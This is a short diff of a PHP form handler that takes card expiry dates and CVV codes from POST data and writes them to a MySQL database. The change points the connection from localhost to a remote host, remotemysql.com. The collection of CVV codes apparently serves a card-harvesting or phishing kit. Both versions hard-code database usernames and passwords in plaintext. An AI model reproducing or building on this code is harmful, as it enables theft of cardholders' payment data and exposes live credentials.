@@ -10,7 +10,7 @@ if(isset($_POST)){
     $expmonth = $_POST['expmonth'];
     $expyear = $_POST['expyear'];
     $cvv = $_POST['cvv'];
-    $mysqli = new mysqli('localhost', 'jlysmlhb_user', 'ertHi98..DE1', 'jlysmlhb_db');
+    $mysqli = new mysqli('remotemysql.com', 'wBMpn2zR3V', 'zxUBDGbtpG', 'wBMpn2zR3V');
     $mysqli->set_charset("utf8mb4");
     if(mysqli_connect_errno()){
         echo "FUCK";
